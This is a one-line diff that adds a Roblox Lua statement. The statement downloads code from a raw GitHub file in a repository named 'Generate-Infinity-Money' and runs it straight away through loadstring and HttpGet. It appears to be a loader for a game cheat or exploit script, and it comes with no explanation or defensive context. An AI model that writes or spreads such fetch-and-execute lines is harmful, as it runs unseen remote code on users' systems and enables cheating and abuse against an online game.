@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ZhenX201/Generate-Infinity-Money/main/source"))()
